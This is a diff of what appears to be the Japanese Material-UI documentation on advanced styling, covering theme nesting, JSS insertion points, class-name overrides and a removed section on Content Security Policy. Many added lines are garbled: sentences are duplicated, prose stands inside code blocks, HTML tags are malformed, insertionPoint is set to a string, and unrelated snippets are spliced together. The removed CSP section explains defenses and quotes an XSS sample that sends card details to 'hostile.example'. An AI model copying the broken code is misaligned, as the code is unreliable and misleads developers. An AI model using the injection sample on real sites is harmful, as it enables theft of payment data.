@@ -62,9 +62,9 @@ const DeepChild = withTheme(DeepChildRaw);
 
 {{"demo": "pages/styles/advanced/WithTheme.js"}}
 
-### ネストテーマ
+### テーマのネスティング
 
-複数のテーマプロバイダーをネストできます。 これは、互いに異なる外観を持つアプリケーションのさまざまな領域を扱うときに非常に役立ちます。
+複数のテーマプロバイダーをネストできます。 これは、互いに異なる外観を持つアプリケーションのさまざまな領域を扱うときに非常に役立ちます。 これは、互いに異なる外観を持つアプリケーションのさまざまな領域を扱うときに非常に役立ちます。
 
 ```jsx
 <ThemeProvider theme={outerTheme}>
@@ -77,10 +77,10 @@ const DeepChild = withTheme(DeepChildRaw);
 
 {{"demo": "pages/styles/advanced/ThemeNesting.js"}}
 
-内部テーマは外側のテーマを**オーバーライドします**。 関数を提供することにより、外側のテーマを拡張できます。
+内部テーマは外側のテーマを**オーバーライドします**。 内部テーマは外側のテーマを**オーバーライドします**。 関数を提供することにより、外側のテーマを拡張できます。
 
 ```jsx
-<ThemeProvider theme={…} >
+<ThemeProvider theme={… } >
   <Child1 />
   <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
     <Child2 />
@@ -192,8 +192,7 @@ const jss = create({
 export default function App() {
   return (
     <StylesProvider jss={jss}>
-      ...
-    </StylesProvider>
+      ... </StylesProvider>
   );
 }
 ```
@@ -236,7 +235,10 @@ import { StylesProvider } from '@material-ui/core/styles';
 
 <StylesProvider injectFirst>
   {/* Your component tree.
-      Styled components can override Material-UI's styles. */}
+      import { StylesProvider } from '@material-ui/core/styles';
+
+<StylesProvider injectFirst>
+  {/* Your component tree. */}
 </StylesProvider>
 ```
 
@@ -269,8 +271,7 @@ export default function MyComponent() {
   const className = clsx(classes.root, classesBase.root)
 
   // color: red 🔴 wins.
-  return <div className={className} />;
-}
+  However, the class names are often non-deterministic.
 ```
 
 The hook call order and the class name concatenation order **don't matter**.
@@ -285,8 +286,8 @@ The simplest approach is to add an HTML comment to the `<head>` that determines 
 
 ```html
 <head>
-  <!-- jss-insertion-point -->
-  <link href="...">
+  <noscript id="jss-insertion-point" />
+  <link href="..." />
 </head>
 ```
 
@@ -311,8 +312,9 @@ export default function App() {
 
 ```jsx
 <head>
-  <noscript id="jss-insertion-point" />
-  <link href="..." />
+  <!-- jss-insertion-point -->
+  <link href="...">
+</head> />
 </head>
 ```
 
@@ -323,7 +325,7 @@ import { StylesProvider, jssPreset } from '@material-ui/core/styles';
 const jss = create({
   ...jssPreset(),
   // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
-  insertionPoint: document.getElementById('jss-insertion-point'),
+  insertionPoint: 'jss-insertion-point',
 });
 
 export default function App() {
@@ -338,13 +340,16 @@ codesandbox.io prevents access to the `<head>` element. To get around this issue
 ```jsx
 import { create } from 'jss';
 import { StylesProvider, jssPreset } from '@material-ui/core/styles';
-
-const styleNode = document.createComment('jss-insertion-point');
-document.head.insertBefore(styleNode, document.head.firstChild);
+import rtl from 'jss-rtl'
 
 const jss = create({
-  ...jssPreset(),
-  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
+  plugins: [...jssPreset().plugins, rtl()],
+});
+
+export default function App() {
+  return (
+    <StylesProvider jss={jss}>
+      ...
   insertionPoint: 'jss-insertion-point',
 });
 
@@ -468,10 +473,11 @@ generates the following class names that you can override:
 .MuiButton-outlined { /* … */ }
 .MuiButton-outlined.Mui-disabled { /* … */ }
 .MuiButton-outlinedPrimary: { /* … */ }
-.MuiButton-outlinedPrimary:hover { /* … */ }
+.MuiButton-outlinedPrimary:hover { /* … */
+}
 ```
 
-*This is a simplification of the `@material-ui/core/Button` component's style sheet.*
+_This is a simplification of the `@material-ui/core/Button` component's style sheet._
 
 Customization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:
 
@@ -516,60 +522,3 @@ You can also combine JSS generated class names with global ones.
 ## CSS prefixes
 
 JSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.
-
-## コンテンツセキュリティポリシー（CSP）
-
-### What is CSP and why is it useful?
-
-Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:
-
-```html
-<script>
-  sendCreditCardDetails('https://hostile.example');
-</script>
-```
-
-This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.
-
-You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
-
-### CSPの実装方法
-
-In order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.
-
-A CSP nonce is a Base 64 encoded string. You can generate one like this:
-
-```js
-import uuidv4 from 'uuid/v4';
-
-const nonce = new Buffer(uuidv4()).toString('base64');
-```
-
-It is very important that you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:
-
-```js
-header('Content-Security-Policy')
-  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
-```
-
-If you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.
-
-```jsx
-<style
-  id="jss-server-side"
-  nonce={nonce}
-  dangerouslySetInnerHTML={{ __html: sheets.toString() }}
-/>
-```
-
-Then, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags.
-
-The way that you do this is by passing a `<meta property="csp-nonce" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property="csp-nonce"` tag and use the `content` value as the nonce.
-
-You must include this header regardless of whether or not SSR is used. Here is an example of what a fictional header could look like:
-
-```html
-<head>
-  <meta property="csp-nonce" content="this-is-a-nonce-123" />
-</head>
-```
